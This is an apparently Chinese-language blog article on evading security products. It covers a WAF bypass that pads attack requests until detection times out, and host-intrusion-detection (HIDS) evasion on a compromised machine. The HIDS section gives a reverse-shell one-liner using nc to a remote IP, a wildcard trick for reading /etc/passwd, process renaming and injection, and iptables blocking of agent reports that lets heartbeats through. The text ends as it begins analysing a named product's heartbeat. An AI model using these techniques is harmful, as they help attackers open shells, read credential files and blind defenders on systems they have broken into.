# 安全产品绕过的一些思路

基于安全产品的攻防对抗一直比较热门的话题，各种绕过方式层出不穷，安全产品自身的防御能力是有限的，他不是一开发，部署完成就可以不管了，一劳永逸，防住所有攻击，他需要一个规则的持续完善，告警规则，拦截规则。只要是规则，就一定有疏漏，攻击者就能根据规则的疏漏绕过防护，防御者则根据绕过更新规则，最后演变成了规则的对抗，防御者就赌攻击者不知道内部告警规则。本文主要谈谈一个通用的安全产品绕过思路。

### WAF

WAF 的绕过已经是老生常谈的话题了，传统的对抗方式是正面对抗 waf 的规则，基于规则的疏漏，基于后端语言的一些特性，基于中间件处理数据的差异等等，这里不讲正面对抗，讲一下 WAF 工作模式的天然缺陷。

waf 的部署方式有多种，反向代理，物理串联，旁路模式等，用的比较多的是基于中间件做转发的架构，这种方式对现有业务的链路的侵入性较小

![waf架构](pic/waf架构.png)

基本的工作流程是用户请求先到转发服务，转发服务将请求转发到 waf 集群，转发服务根据 waf 集群检测结果决定是否拦截请求。这就有一个问题，转发服务需要等待waf集群检测结果才能决定是否拦截，如果发送的包特别大， waf 集群返回结果特别慢，转发服务器会一直等吗？

遇到这种情况 waf 往往有两种选择，一是设置超时时间，规定时间内没有返回结果直接放行，二是一直等。大多数业务复杂的公司会选择第一种方式，由于业务体量大，不可控因素太多，很可能就有业务需要上传大文件，并且具体有多大不可估计，不确定 waf 的算力能否短时间内计算出结果，如果强行等待会使此类接口响应异常慢，最终影响的业务。

那么问题就来了，RFC 规定里并没有限制 POST 包的大小，也就是说 请求包能无限大，理论上 waf 集群检测的时间也会无限长，只要在攻击包中添加大量无用数据，使 waf 检测超时，那么转发服务器就会直接放行，从而绕过waf。

### HIDS

绕过 HIDS 可以说是最简单的，也可以说是最难的，说他简单是因为技术上讲在拿到机器权限后想要干扰上面一个进程正常工作有无数种方法，说他难是因为要拿到机器权限。

以实际场景来讲 HIDS 的绕过，假设有一台机器存在命令执行漏洞，你想完全控制机器，留后门也好，扫内网也好，但这台机器上装有 HIDS ，在执行命令时稍微不注意就会出发告警，然后GG，你该怎么办？你需要绕 HIDS。

HIDS 根据实现原理有不同的绕过方式，这里列几个：

1. 上传自己的 bash

2. cp bin/bash test  nc -e test 192.168.11.1 6666

3. 进程注入
4. 利用 linux 执行命令的特性 cat /et?/pass??

这些方式不同用，需要根据 HIDS 的实现来确认，比如反弹 shell 检测，HIDS 一般会检测两点，一是交互式 shell，二是 shell 进程输入输出是一个远程 socket，那 hids 怎么判断进程是否是交互式 shell 呢？进程名，那就改一下进程名呗。

这里再讲一个通用绕过思路：网络阻断。

HIDS 的 Agent 只会负责收集主机信息，并将主机信息发送至接收端，由接收端来做告警，只要能阻止 Agent 上报信息，就能让 HIDS 闭嘴。一个简单粗暴的方法就是 iptable 拒绝掉与接收端的通信，我怎么知道接收端的地址？看进程呗，常见的 HIDS 进程名。但这种方式不够优雅，因为强行阻断网络连接会使接收端显示这个机器离线，当然，对于大型企业来说，装有 HIDS 的资产上千上万台，每天离线，变更的机器有很多，你把这台机器搞离线了也没问题，HIDS 也不会告警（这要告警安全团队得炸）， 那么有没有更加优雅一点的方式呢？

要解决离线的问题就得知道接收端是怎么判断 Agent 离线的，很自然的就想到心跳包，如果能识别心跳包，做一个流量劫持，只放心跳包，其他全拦了，这就既能阻止告警，还能维持主机在线。心跳包长啥样这就得根据具体的 HIDS 分析了，这里分析某知名 HIDS 的心跳包特征

